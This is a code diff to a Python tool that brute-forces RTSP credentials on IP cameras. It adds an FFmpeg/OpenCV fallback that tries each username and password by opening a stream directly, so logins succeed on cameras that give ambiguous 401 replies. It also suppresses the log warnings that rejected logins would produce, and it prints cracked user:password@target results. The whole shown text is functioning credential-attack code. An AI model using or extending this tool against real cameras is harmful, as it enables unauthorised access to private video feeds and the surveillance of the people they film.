@@ -36,6 +36,11 @@ os.environ.setdefault(
     "OPENCV_FFMPEG_CAPTURE_OPTIONS",
     "rtsp_transport;tcp|stimeout;5000000|timeout;5000000",
 )
+# Silence libavformat's own chatter (e.g. "method OPTIONS failed: 401") and
+# OpenCV's VIDEOIO warnings emitted by the FFmpeg fallback on rejected
+# credentials. Both must precede the cv2 import.
+os.environ.setdefault("OPENCV_FFMPEG_LOGLEVEL", "-8")
+os.environ.setdefault("OPENCV_LOG_LEVEL", "SILENT")
 
 import re
 import csv
@@ -57,6 +62,10 @@ from time import strftime, localtime, time
 try:
     import cv2  # type: ignore
     _HAS_CV2 = True
+    try:
+        cv2.setLogLevel(0)  # LOG_LEVEL_SILENT — no OpenCV VIDEOIO warnings
+    except Exception:
+        pass
 except Exception:
     _HAS_CV2 = False
 
@@ -710,6 +719,12 @@ def rtsp_bruteforce(host, routes, creds, timeout):
     credential is valid but the path is wrong (auth-first cameras answer 401 for
     every path until authenticated, then 404 for a wrong path), so we sweep the
     remaining routes with that now-known-good credential.
+
+    Phase C (FFmpeg fallback): if the native engine never gets a decisive
+    200/404 for any credential — the "401-both" case, where the camera answers
+    401 for both a wrong credential AND a valid credential on a wrong path — fall
+    back to the original tool's method: a full FFmpeg open on the route-removed
+    ``rtsp://user:pass@host`` URL, per credential. Best-effort and OpenCV-only.
     """
     auth_routes = []
     for raw_path, port in routes:
@@ -721,24 +736,72 @@ def rtsp_bruteforce(host, routes, creds, timeout):
             auth_routes.append((raw_path, port))
 
     candidate_routes = auth_routes or routes
-    if not candidate_routes:
-        return None
+    if candidate_routes:
+        primary_path, primary_port = candidate_routes[0]
+        for user, password in creds:
+            uri = _route_uri(host, primary_port, primary_path, user, password)
+            code = _describe_auth(host, primary_port, uri, user, password, timeout)
+            if code == 200:
+                return {"user": user, "password": password, "url": uri}
+            if code == 404:  # credential valid, wrong path -> sweep the other routes
+                for raw_path, port in candidate_routes:
+                    sweep_uri = _route_uri(host, port, raw_path, user, password)
+                    sweep_code = _describe_auth(host, port, sweep_uri, user, password, timeout)
+                    if sweep_code == 200:
+                        return {"user": user, "password": password, "url": sweep_uri}
+                # Authenticated, but none of our known routes streamed. Report the
+                # working credential anyway (path unknown).
+                return {"user": user, "password": password, "url": uri, "no_route": True}
 
-    primary_path, primary_port = candidate_routes[0]
-    for user, password in creds:
-        uri = _route_uri(host, primary_port, primary_path, user, password)
-        code = _describe_auth(host, primary_port, uri, user, password, timeout)
-        if code == 200:
-            return {"user": user, "password": password, "url": uri}
-        if code == 404:  # credential valid, wrong path -> sweep the other routes
-            for raw_path, port in candidate_routes:
-                sweep_uri = _route_uri(host, port, raw_path, user, password)
-                sweep_code = _describe_auth(host, port, sweep_uri, user, password, timeout)
-                if sweep_code == 200:
-                    return {"user": user, "password": password, "url": sweep_uri}
-            # Authenticated, but none of our known routes streamed. Report the
-            # working credential anyway (path unknown).
-            return {"user": user, "password": password, "url": uri, "no_route": True}
+    # Phase C — 401-both fallback. The native DESCRIBE engine was inconclusive
+    # (or Phase A pruned every route). Try each credential the original way: a
+    # full FFmpeg open on the route-removed URL. FFmpeg's complete negotiation
+    # confirms a credential where a bare DESCRIBE stays ambiguously 401.
+    if _HAS_CV2:
+        fallback_port = (candidate_routes[0][1] if candidate_routes
+                         else routes[0][1] if routes else DEFAULT_PORTS["rtsp"])
+        for user, password in creds:
+            url = _ffmpeg_login(host, fallback_port, user, password)
+            if url:
+                return {"user": user, "password": password, "url": url,
+                        "ffmpeg": True}
+    return None
+
+
+def _root_uri(host, port, user, password):
+    """Route-removed RTSP URL with credentials in the authority component, e.g.
+    ``rtsp://user:pass@host:port`` (anonymous when no creds). This is the form
+    the original tool used — no explicit stream path."""
+    from urllib.parse import quote
+    if user or password:
+        cred = f"{quote(user or '', safe='')}:{quote(password or '', safe='')}@"
+    else:
+        cred = ""
+    return f"rtsp://{cred}{host}:{port}"
+
+
+def _ffmpeg_login(host, port, user, password):
+    """Last-resort login check via a full FFmpeg negotiation on the route-removed
+    URL, mirroring the original tool. Returns the working URL if the stream
+    opens, else None.
+
+    FFmpeg runs the complete RTSP handshake (OPTIONS/DESCRIBE/SETUP/PLAY), so it
+    can confirm a credential on cameras whose bare DESCRIBE answers an
+    indistinguishable 401 for both a wrong credential AND a valid credential on a
+    wrong path. Needs OpenCV; a silent no-op without it. The connect/read time is
+    bounded by OPENCV_FFMPEG_CAPTURE_OPTIONS (set at import time)."""
+    if not _HAS_CV2:
+        return None
+    url = _root_uri(host, port, user, password)
+    try:
+        video_capture = cv2.VideoCapture(url, cv2.CAP_FFMPEG)
+        try:
+            if video_capture.isOpened():
+                return url
+        finally:
+            video_capture.release()
+    except Exception:
+        return None
     return None
 
 
@@ -838,6 +901,8 @@ def crack_host(target, base_combos, db, options):
             note = " (no auth)"
         elif result.get("no_route"):
             note = " (auth ok, stream path unknown)"
+        elif result.get("ffmpeg"):
+            note = " (via ffmpeg, route removed)"
         with lock:
             display('+', f"{result['user']}:{result['password']}"
                          f"@{target} => "
